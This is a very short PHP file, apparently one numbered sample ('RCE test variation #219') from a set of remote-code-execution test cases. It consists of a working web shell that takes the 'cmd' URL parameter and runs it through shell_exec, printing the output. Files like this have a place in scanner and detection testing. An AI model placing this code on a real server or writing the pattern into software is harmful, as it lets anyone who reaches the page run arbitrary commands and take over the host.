<?php
// RCE test variation #219
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>